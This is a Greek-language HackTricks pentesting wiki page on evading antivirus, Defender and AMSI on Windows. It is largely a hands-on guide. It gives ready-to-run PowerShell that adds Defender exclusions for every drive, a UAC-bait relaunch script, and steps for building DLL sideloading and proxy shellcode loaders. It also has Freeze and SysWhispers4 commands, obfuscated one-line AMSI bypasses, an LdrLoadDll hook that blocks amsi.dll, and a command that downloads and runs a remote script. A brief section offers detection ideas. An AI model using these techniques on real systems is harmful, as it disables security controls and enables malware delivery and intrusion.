# Παράκαμψη Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Αυτή η σελίδα γράφτηκε από** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Σταμάτημα Defender

- [defendnot](https://github.com/es3n1n/defendnot): Ένα εργαλείο για να σταματήσει τη λειτουργία του Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Ένα εργαλείο για να σταματήσει τη λειτουργία του Windows Defender παριστάνοντας ένα άλλο AV.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

### Installer-style UAC δόλωμα πριν την παρέμβαση στο Defender

Public loaders που προσποιούνται game cheats συχνά διανέμονται ως unsigned Node.js/Nexe installers που πρώτα **ζητούν από τον χρήστη ανύψωση προνομίων** και μόνο μετά εξουδετερώνουν τον Defender. Η ροή είναι απλή:

1. Ελέγχουν για περιβάλλον διαχειριστή με `net session`. Η εντολή πετυχαίνει μόνο όταν ο εκτελών έχει admin δικαιώματα, οπότε η αποτυχία υποδεικνύει ότι ο loader τρέχει ως τυπικός χρήστης.
2. Αμέσως επανεκκινεί τον εαυτό του με το `RunAs` verb για να ενεργοποιήσει την αναμενόμενη προτροπή συγκατάθεσης UAC, διατηρώντας την αρχική γραμμή εντολών.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Τα θύματα ήδη πιστεύουν ότι εγκαθιστούν “cracked” λογισμικό, οπότε η προτροπή συνήθως γίνεται αποδεκτή, δίνοντας στο malware τα δικαιώματα που χρειάζεται για να αλλάξει την πολιτική του Defender.

### Γενικές εξαιρέσεις `MpPreference` για κάθε γράμμα δίσκου

Μόλις αποκτήσουν αυξημένα δικαιώματα, αλυσίδες τύπου GachiLoader μεγιστοποιούν τα τυφλά σημεία του Defender αντί να απενεργοποιούν την υπηρεσία εντελώς. Ο loader πρώτα σκοτώνει το GUI watchdog (`taskkill /F /IM SecHealthUI.exe`) και στη συνέχεια προσθέτει **εξαιρετικά ευρείες εξαιρέσεις** ώστε κάθε προφίλ χρήστη, κατάλογος συστήματος και αφαιρούμενος δίσκος να μη μπορεί να σαρωθεί:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Key observations:

- Ο βρόχος διατρέχει κάθε προσαρτημένο filesystem (D:\, E:\, USB sticks, κ.λπ.) οπότε **οποιοδήποτε μελλοντικό payload που θα αποθηκευτεί οπουδήποτε στο δίσκο αγνοείται**.
- Η εξαίρεση για την επέκταση `.sys` είναι μελλοντοστραφής—οι επιτιθέμενοι διατηρούν την επιλογή να φορτώσουν unsigned drivers αργότερα χωρίς να πειράξουν ξανά τον Defender.
- Όλες οι αλλαγές καταχωρούνται κάτω από `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, επιτρέποντας στα επόμενα στάδια να επιβεβαιώσουν ότι οι εξαιρέσεις παραμένουν ή να τις επεκτείνουν χωρίς να ενεργοποιήσουν ξανά το UAC.

Επειδή καμία υπηρεσία του Defender δεν τερματίζεται, απλοϊκοί έλεγχοι υγείας συνεχίζουν να αναφέρουν “antivirus active” παρόλο που η επιθεώρηση σε πραγματικό χρόνο δεν πειράζει ποτέ αυτές τις διαδρομές.

## **AV Evasion Methodology**

Προς το παρόν, τα AVs χρησιμοποιούν διάφορες μεθόδους για να ελέγξουν αν ένα αρχείο είναι κακόβουλο ή όχι: static detection, dynamic analysis, και για τα πιο προηγμένα EDRs, behavioural analysis.

### **Static detection**

Η static detection επιτυγχάνεται με τον εντοπισμό γνωστών κακόβουλων strings ή ακολουθιών bytes σε ένα binary ή script, καθώς και με την εξαγωγή πληροφοριών από το ίδιο το αρχείο (π.χ. file description, company name, digital signatures, icon, checksum, κ.λπ.). Αυτό σημαίνει ότι η χρήση γνωστών δημόσιων εργαλείων μπορεί να σε πιάσει πιο εύκολα, καθώς έχουν πιθανώς αναλυθεί και επισημανθεί ως κακόβουλα. Υπάρχουν μερικοί τρόποι για να παρακάμψεις αυτό το είδος detection:

- **Encryption**

  Αν κρυπτογραφήσεις το binary, δεν θα υπάρχει τρόπος για το AV να εντοπίσει το πρόγραμμά σου, αλλά θα χρειαστείς κάποιον loader για να το αποκρυπτογραφήσει και να το τρέξει στη μνήμη.

- **Obfuscation**

  Μερικές φορές το μόνο που χρειάζεται είναι να αλλάξεις κάποιες strings στο binary ή script σου για να το περάσεις από το AV, αλλά αυτό μπορεί να είναι χρονοβόρο ανάλογα με το τι προσπαθείς να obfuscate.

- **Custom tooling**

  Αν αναπτύξεις τα δικά σου εργαλεία, δεν θα υπάρχουν γνωστές κακόβουλες signatures, αλλά αυτό απαιτεί πολύ χρόνο και προσπάθεια.

> [!TIP]
> A good way for checking against Windows Defender static detection is [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). It basically splits the file into multiple segments and then tasks Defender to scan each one individually, this way, it can tell you exactly what are the flagged strings or bytes in your binary.

Συστήνω ανεπιφύλακτα να δείτε αυτό το [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) για πρακτική AV Evasion.

### **Dynamic analysis**

Η dynamic analysis είναι όταν το AV τρέχει το binary σου σε ένα sandbox και παρακολουθεί για κακόβουλη δραστηριότητα (π.χ. προσπάθεια να αποκρυπτογραφήσει και να διαβάσει τους κωδικούς του browser σου, εκτέλεση minidump στο LSASS, κ.λπ.). Αυτό το κομμάτι μπορεί να είναι λίγο πιο περίπλοκο, αλλά εδώ είναι μερικά πράγματα που μπορείς να κάνεις για να αποφύγεις sandboxes.

- **Sleep before execution** Ανάλογα με το πώς υλοποιείται, μπορεί να είναι ένας πολύ καλός τρόπος για να παρακάμψεις την dynamic analysis του AV. Τα AV έχουν πολύ λίγο χρόνο για να σαρώσουν αρχεία ώστε να μην διακόψουν τη ροή εργασίας του χρήστη, οπότε η χρήση μεγάλων sleeps μπορεί να διαταράξει την ανάλυση των binaries. Το πρόβλημα είναι ότι πολλά sandboxes των AV μπορούν απλώς να παρακάμψουν το sleep ανάλογα με την υλοποίηση.
- **Checking machine's resources** Συνήθως τα Sandboxes έχουν πολύ λίγους πόρους (π.χ. < 2GB RAM), αλλιώς θα μπορούσαν να επιβραδύνουν το μηχάνημα του χρήστη. Μπορείς επίσης να είσαι πολύ δημιουργικός εδώ, για παράδειγμα ελέγχοντας τη θερμοκρασία της CPU ή ακόμα και τις ταχύτητες του ανεμιστήρα — όχι τα πάντα θα είναι υλοποιημένα στο sandbox.
- **Machine-specific checks** Αν θέλεις να στοχεύσεις έναν χρήστη του οποίου η workstation είναι ενταγμένη στο domain "contoso.local", μπορείς να κάνεις έλεγχο στο domain του υπολογιστή για να δεις αν ταιριάζει με αυτό που έχεις καθορίσει — αν δεν ταιριάζει, μπορείς να κάνεις το πρόγραμμα σου να τερματιστεί.

Αποδεικνύεται ότι το computername του Microsoft Defender's Sandbox είναι HAL9TH, οπότε μπορείς να ελέγξεις το όνομα του υπολογιστή στο malware σου πριν τη detonation — αν το όνομα ταιριάζει με HAL9TH, σημαίνει ότι βρίσκεσαι μέσα στο sandbox του Defender, οπότε μπορείς να κάνεις το πρόγραμμα σου να τερματιστεί.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>πηγή: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Μερικές ακόμα πολύ καλές συμβουλές από [@mgeeky](https://twitter.com/mariuszbit) για αντιμετώπιση των Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev κανάλι</p></figcaption></figure>

Όπως είπαμε πριν σε αυτό το post, **public tools** τελικά **θα εντοπιστούν**, οπότε θα πρέπει να αναρωτηθείς κάτι:

Για παράδειγμα, αν θέλεις να dump-άρεις το LSASS, **πραγματικά χρειάζεται να χρησιμοποιήσεις mimikatz**; Ή θα μπορούσες να χρησιμοποιήσεις κάποιο άλλο project που είναι λιγότερο γνωστό και επίσης κάνει dump του LSASS.

Η σωστή απάντηση πιθανότατα είναι το δεύτερο. Παίρνοντας το mimikatz ως παράδειγμα, είναι ίσως ένα από τα, αν όχι το πιο flag-αρισμένο κομμάτι malware από AVs και EDRs — ενώ το project καθαυτό είναι πολύ καλό, είναι επίσης εφιάλτης να το δουλέψεις για να αποφύγεις τα AVs, οπότε απλώς ψάξε για εναλλακτικές για αυτό που προσπαθείς να επιτύχεις.

> [!TIP]
> When modifying your payloads for evasion, make sure to **turn off automatic sample submission** in defender, and please, seriously, **DO NOT UPLOAD TO VIRUSTOTAL** if your goal is achieving evasion in the long run. If you want to check if your payload gets detected by a particular AV, install it on a VM, try to turn off the automatic sample submission, and test it there until you're satisfied with the result.

## EXEs vs DLLs

Όποτε είναι δυνατόν, πάντα **προτίμησε τη χρήση DLLs για evasion** — κατά την εμπειρία μου, αρχεία DLL συνήθως **εντοπίζονται πολύ λιγότερο** και αναλύονται λιγότερο, οπότε είναι ένα πολύ απλό κόλπο για να αποφύγεις την ανίχνευση σε κάποιες περιπτώσεις (αν φυσικά το payload σου έχει τρόπο να τρέξει ως DLL).

Όπως βλέπουμε σε αυτή την εικόνα, ένα DLL Payload από το Havoc έχει detection rate 4/26 στο antiscan.me, ενώ το EXE payload έχει detection rate 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me σύγκριση ενός κανονικού Havoc EXE payload έναντι ενός κανονικού Havoc DLL</p></figcaption></figure>

Τώρα θα δείξουμε μερικά κόλπα που μπορείς να χρησιμοποιήσεις με αρχεία DLL για να είσαι πολύ πιο διακριτικός.

## DLL Sideloading & Proxying

**DLL Sideloading** εκμεταλλεύεται τη DLL search order που χρησιμοποιεί ο loader, τοποθετώντας την εφαρμογή-θύμα και το/τα malicious payload(s) δίπλα-δίπλα.

Μπορείς να ελέγξεις για προγράμματα ευάλωτα σε DLL Sideloading χρησιμοποιώντας [Siofra](https://github.com/Cybereason/siofra) και το ακόλουθο powershell script:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Αυτή η εντολή θα εμφανίσει τη λίστα των προγραμμάτων που είναι ευάλωτα σε DLL hijacking μέσα στο "C:\Program Files\\" και τα DLL αρχεία που προσπαθούν να φορτώσουν.

Συνιστώ ανεπιφύλακτα να **εξερευνήσετε τα DLL Hijackable/Sideloadable προγράμματα μόνοι σας**, αυτή η τεχνική είναι αρκετά stealthy όταν εκτελείται σωστά, αλλά αν χρησιμοποιήσετε δημόσια γνωστά DLL Sideloadable προγράμματα, μπορεί να συλληφθείτε εύκολα.

Απλά τοποθετώντας ένα κακόβουλο DLL με το όνομα που ένα πρόγραμμα αναμένει να φορτώσει, δεν θα φορτώσει απαραίτητα το payload σας, καθώς το πρόγραμμα αναμένει κάποιες συγκεκριμένες λειτουργίες μέσα σε εκείνο το DLL. Για να διορθώσουμε αυτό το θέμα, θα χρησιμοποιήσουμε μια άλλη τεχνική που ονομάζεται **DLL Proxying/Forwarding**.

**DLL Proxying** προωθεί τις κλήσεις που κάνει ένα πρόγραμμα από το proxy (και κακόβουλο) DLL στο αρχικό DLL, διατηρώντας έτσι τη λειτουργικότητα του προγράμματος και επιτρέποντας την εκτέλεση του payload σας.

Θα χρησιμοποιήσω το έργο [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) από τον/την [@flangvik](https://twitter.com/Flangvik/)

Αυτά είναι τα βήματα που ακολούθησα:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Η τελευταία εντολή θα μας δώσει 2 αρχεία: ένα πρότυπο πηγαίου κώδικα DLL και το αρχικό μετονομασμένο DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Και το shellcode μας (κωδικοποιημένο με [SGN](https://github.com/EgeBalci/sgn)) και το proxy DLL έχουν ποσοστό εντοπισμού 0/26 στο [antiscan.me](https://antiscan.me)! Θα το χαρακτήριζα επιτυχία.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Σας **συστήνω ανεπιφύλακτα** να παρακολουθήσετε [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) για το DLL Sideloading και επίσης [το βίντεο του ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE) για να μάθετε περισσότερα σχετικά με όσα συζητήσαμε σε βάθος.

### Κατάχρηση των Forwarded Exports (ForwardSideLoading)

Τα Windows PE modules μπορούν να εξάγουν functions που στην πραγματικότητα είναι "forwarders": αντί να δείχνουν σε κώδικα, η εγγραφή εξαγωγής περιέχει ένα ASCII string της μορφής `TargetDll.TargetFunc`. Όταν ένας caller επιλύει την export, ο Windows loader θα:

- Φορτώσει `TargetDll` εάν δεν έχει ήδη φορτωθεί
- Επιλύσει `TargetFunc` από αυτό

Βασικές συμπεριφορές που πρέπει να κατανοήσετε:
- Εάν `TargetDll` είναι KnownDLL, παρέχεται από το προστατευμένο namespace KnownDLLs (π.χ., ntdll, kernelbase, ole32).
- Εάν `TargetDll` δεν είναι KnownDLL, χρησιμοποιείται η κανονική σειρά αναζήτησης DLL, η οποία περιλαμβάνει τον κατάλογο του module που πραγματοποιεί την forward resolution.

Αυτό επιτρέπει ένα έμμεσο sideloading primitive: βρείτε ένα signed DLL που εξάγει μια function προωθημένη σε ένα non-KnownDLL module name, και τοποθετήστε το signed DLL μαζί με ένα attacker-controlled DLL με όνομα ακριβώς όπως το προωθημένο target module. Όταν η forwarded export καλείται, ο loader επιλύει την forward και φορτώνει το DLL σας από τον ίδιο κατάλογο, εκτελώντας το DllMain σας.

Παράδειγμα που παρατηρήθηκε στα Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` δεν είναι KnownDLL, οπότε επιλύεται μέσω της κανονικής σειράς αναζήτησης.

PoC (copy-paste):
1) Αντιγράψτε το signed system DLL σε έναν writable φάκελο
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Αποθέστε ένα κακόβουλο `NCRYPTPROV.dll` στον ίδιο φάκελο. Ένα ελάχιστο DllMain αρκεί για εκτέλεση κώδικα· δεν χρειάζεται να υλοποιήσετε την forwarded function για να ενεργοποιηθεί το DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Προκαλέστε την προώθηση με ένα υπογεγραμμένο LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- rundll32 (υπογεγραμμένο) φορτώνει το side-by-side `keyiso.dll` (υπογεγραμμένο)
- Ενώ επιλύει το `KeyIsoSetAuditingInterface`, ο φορτωτής ακολουθεί το forward προς `NCRYPTPROV.SetAuditingInterface`
- Ο φορτωτής στη συνέχεια φορτώνει το `NCRYPTPROV.dll` από το `C:\test` και εκτελεί το `DllMain` του
- Εάν το `SetAuditingInterface` δεν είναι υλοποιημένο, θα λάβετε σφάλμα "missing API" μόνο αφού το `DllMain` έχει ήδη εκτελεστεί

Hunting tips:
- Επικεντρωθείτε σε forwarded exports όπου το target module δεν είναι KnownDLL. Οι KnownDLLs αναγράφονται υπό `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Μπορείτε να απαριθμήσετε forwarded exports με εργαλεία όπως:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Δείτε τον κατάλογο forwarder του Windows 11 για να αναζητήσετε υποψήφιους: https://hexacorn.com/d/apis_fwd.txt

Detection/defense ideas:
- Παρακολουθήστε LOLBins (e.g., rundll32.exe) που φορτώνουν signed DLLs από μη-system paths, ακολουθούμενα από φόρτωση μη-KnownDLLs με το ίδιο base name από εκείνον τον κατάλογο
- Ειδοποιήστε για αλυσίδες διεργασίας/μονάδων όπως: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` σε διαδρομές εγγράψιμες από τον χρήστη
- Εφαρμόστε πολιτικές ακεραιότητας κώδικα (WDAC/AppLocker) και απορρίψτε write+execute σε καταλόγους εφαρμογών

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Μπορείτε να χρησιμοποιήσετε το Freeze για να φορτώσετε και να εκτελέσετε το shellcode σας με διακριτικό τρόπο.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion είναι απλώς ένα παιχνίδι γάτας και ποντικιού — ό,τι δουλεύει σήμερα μπορεί να εντοπιστεί αύριο, οπότε μην βασίζεστε μόνο σε ένα εργαλείο· αν είναι δυνατόν, δοκιμάστε chaining πολλαπλών evasion techniques.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDRs συχνά τοποθετούν **user-mode inline hooks** σε `ntdll.dll` syscall stubs. Για να παρακάμψετε αυτά τα hooks, μπορείτε να δημιουργήσετε **direct** ή **indirect** syscall stubs που φορτώνουν το σωστό **SSN** (System Service Number) και κάνουν transition σε kernel mode χωρίς να εκτελεστεί το hooked export entrypoint.

**Invocation options:**
- **Direct (embedded)**: emit a `syscall`/`sysenter`/`SVC #0` instruction in the generated stub (no `ntdll` export hit).
- **Indirect**: jump into an existing `syscall` gadget inside `ntdll` so the kernel transition appears to originate from `ntdll` (useful for heuristic evasion); **randomized indirect** picks a gadget from a pool per call.
- **Egg-hunt**: avoid embedding the static `0F 05` opcode sequence on disk; resolve a syscall sequence at runtime.

**Hook-resistant SSN resolution strategies:**
- **FreshyCalls (VA sort)**: infer SSNs by sorting syscall stubs by virtual address instead of reading stub bytes.
- **SyscallsFromDisk**: map a clean `\KnownDlls\ntdll.dll`, read SSNs from its `.text`, then unmap (bypasses all in-memory hooks).
- **RecycledGate**: combine VA-sorted SSN inference with opcode validation when a stub is clean; fall back to VA inference if hooked.
- **HW Breakpoint**: set DR0 on the `syscall` instruction and use a VEH to capture the SSN from `EAX` at runtime, without parsing hooked bytes.

Example SysWhispers4 usage:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI δημιουργήθηκε για να αποτρέψει "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Αρχικά, τα AVs μπορούσαν μόνο να σαρώσουν **αρχεία στο δίσκο**, οπότε αν κατάφερνες να εκτελέσεις payloads **απευθείας στη μνήμη**, το AV δεν μπορούσε να κάνει τίποτα για να το σταματήσει, καθώς δεν είχε αρκετή ορατότητα.

The AMSI feature is integrated into these components of Windows.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Επιτρέπει στις λύσεις antivirus να επιθεωρούν τη συμπεριφορά των script εκθέτοντας τα περιεχόμενα των script σε μορφή που είναι unencrypted και unobfuscated.

Η εκτέλεση `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` θα προκαλέσει την ακόλουθη ειδοποίηση στο Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Παρατηρήστε πώς προθέτει το `amsi:` και στη συνέχεια τη διαδρομή του εκτελέσιμου από το οποίο τρέχει το script — σε αυτή την περίπτωση, `powershell.exe`.

Δεν αφήσαμε κανένα αρχείο στο δίσκο, αλλά παρ' όλα αυτά εντοπιστήκαμε στη μνήμη λόγω του AMSI.

Επιπλέον, από **.NET 4.8** και μετά, ο κώδικας C# περνά επίσης από το AMSI. Αυτό επηρεάζει ακόμη και το `Assembly.Load(byte[])` για εκτέλεση στη μνήμη. Γι' αυτό συνιστάται η χρήση χαμηλότερων εκδόσεων του .NET (π.χ. 4.7.2 ή χαμηλότερα) για in-memory εκτέλεση αν θέλετε να αποφύγετε το AMSI.

There are a couple of ways to get around AMSI:

- **Obfuscation**

Since AMSI mainly works with static detections, therefore, modifying the scripts you try to load can be a good way for evading detection.

However, AMSI has the capability of unobfuscating scripts even if it has multiple layers, so obfuscation could be a bad option depending on how it's done. This makes it not-so-straightforward to evade. Although, sometimes, all you need to do is change a couple of variable names and you'll be good, so it depends on how much something has been flagged.

- **AMSI Bypass**

Since AMSI is implemented by loading a DLL into the powershell (also cscript.exe, wscript.exe, etc.) process, it's possible to tamper with it easily even running as an unprivileged user. Due to this flaw in the implementation of AMSI, researchers have found multiple ways to evade AMSI scanning.

**Forcing an Error**

Forcing the AMSI initialization to fail (amsiInitFailed) will result that no scan will be initiated for the current process. Originally this was disclosed by [Matt Graeber](https://twitter.com/mattifestation) and Microsoft has developed a signature to prevent wider usage.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Αρκούσε μία γραμμή κώδικα powershell για να καταστήσει το AMSI άχρηστο για την τρέχουσα διεργασία powershell. Αυτή η γραμμή έχει φυσικά εντοπιστεί από το ίδιο το AMSI, οπότε απαιτείται κάποια τροποποίηση για να χρησιμοποιηθεί αυτή η τεχνική.

Ακολουθεί ένας τροποποιημένος AMSI bypass που πήρα από αυτό το [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.

**Memory Patching**

Η τεχνική αυτή ανακαλύφθηκε αρχικά από [@RastaMouse](https://twitter.com/_RastaMouse/) και περιλαμβάνει τον εντοπισμό της διεύθυνσης της "AmsiScanBuffer" συνάρτησης στο `amsi.dll` (υπεύθυνη για το σάρωμα της εισόδου που παρέχει ο χρήστης) και την αντικατάστασή της με εντολές που επιστρέφουν τον κωδικό E_INVALIDARG. Με αυτόν τον τρόπο, το αποτέλεσμα της πραγματικής σάρωσης θα επιστρέψει 0, το οποίο ερμηνεύεται ως καθαρό αποτέλεσμα.

> [!TIP]
> Διαβάστε [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) για μια πιο λεπτομερή εξήγηση.

Υπάρχουν επίσης πολλές άλλες τεχνικές που χρησιμοποιούνται για να παρακάμψουν το AMSI με powershell — δείτε [**αυτή τη σελίδα**](basic-powershell-for-pentesters/index.html#amsi-bypass) και [**αυτό το repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) για να μάθετε περισσότερα σχετικά με αυτές.

### Αποτροπή του AMSI με την αποφυγή φόρτωσης του `amsi.dll` (LdrLoadDll hook)

Το AMSI αρχικοποιείται μόνο αφού το `amsi.dll` φορτωθεί στην τρέχουσα διεργασία. Μια ανθεκτική, ανεξάρτητη από τη γλώσσα παράκαμψη είναι η τοποθέτηση ενός user‑mode hook στο `ntdll!LdrLoadDll` που επιστρέφει σφάλμα όταν το ζητούμενο module είναι το `amsi.dll`. Ως αποτέλεσμα, το AMSI δεν φορτώνεται ποτέ και δεν εκτελούνται σαρώσεις για εκείνη τη διεργασία.

Περίγραμμα υλοποίησης (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notes
- Λειτουργεί σε PowerShell, WScript/CScript και custom loaders (οτιδήποτε που διαφορετικά θα φόρτωνε το AMSI).
- Συνδυάστε το με τροφοδοσία scripts μέσω stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) για να αποφύγετε εκτενείς ενδείξεις στη γραμμή εντολών.
- Έχει παρατηρηθεί να χρησιμοποιείται από loaders που εκτελούνται μέσω LOLBins (π.χ., `regsvr32` καλεί `DllRegisterServer`).

The tool **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** also generates script to bypass AMSI.
The tool **[https://amsibypass.com/](https://amsibypass.com/)** also generates script to bypass AMSI that avoid signature by randomized user-defined function, variables, characters expression and applies random character casing to PowerShell keywords to avoid signature.

**Remove the detected signature**

Μπορείτε να χρησιμοποιήσετε ένα εργαλείο όπως **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** και **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** για να αφαιρέσετε την ανιχνευμένη AMSI signature από τη memory της τρέχουσας διεργασίας. Το εργαλείο αυτό λειτουργεί σαρώνοντας τη memory της τρέχουσας διεργασίας για την AMSI signature και στη συνέχεια την αντικαθιστά με NOP instructions, αφαιρώντας την ουσιαστικά από τη memory.

**AV/EDR products that uses AMSI**

Μπορείτε να βρείτε μια λίστα με AV/EDR products που χρησιμοποιούν AMSI στο **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Use Powershell version 2**
If you use PowerShell version 2, AMSI will not be loaded, so you can run your scripts without being scanned by AMSI. You can do this:
```bash
powershell.exe -version 2
```
## Καταγραφή PowerShell

Η καταγραφή PowerShell είναι μια λειτουργία που σας επιτρέπει να καταγράφετε όλες τις εντολές PowerShell που εκτελούνται σε ένα σύστημα. Αυτό μπορεί να είναι χρήσιμο για σκοπούς ελέγχου και αντιμετώπισης προβλημάτων, αλλά μπορεί επίσης να αποτελεί **πρόβλημα για επιτιθέμενους που θέλουν να αποφύγουν τον εντοπισμό**.

Για να παρακάμψετε την καταγραφή PowerShell, μπορείτε να χρησιμοποιήσετε τις ακόλουθες τεχνικές:

- **Disable PowerShell Transcription and Module Logging**: Μπορείτε να χρησιμοποιήσετε ένα εργαλείο όπως [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) για αυτόν τον σκοπό.
